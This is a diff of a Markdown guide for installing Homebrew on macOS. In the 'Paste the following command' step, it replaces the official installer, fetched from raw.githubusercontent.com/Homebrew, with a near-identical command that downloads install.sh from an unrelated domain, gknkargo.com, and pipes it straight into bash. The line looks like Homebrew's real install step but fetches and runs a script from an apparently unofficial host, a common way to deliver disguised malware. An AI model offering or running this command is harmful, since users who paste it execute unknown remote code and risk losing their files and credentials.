@@ -13,4 +13,5 @@ You can launch it from Spotlight (`⌘ + Space` → type `Terminal` → hit `Ent
 ### 2. Paste the following command:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://gknkargo.com/Homebrew/install/HEAD/install.sh)"
+
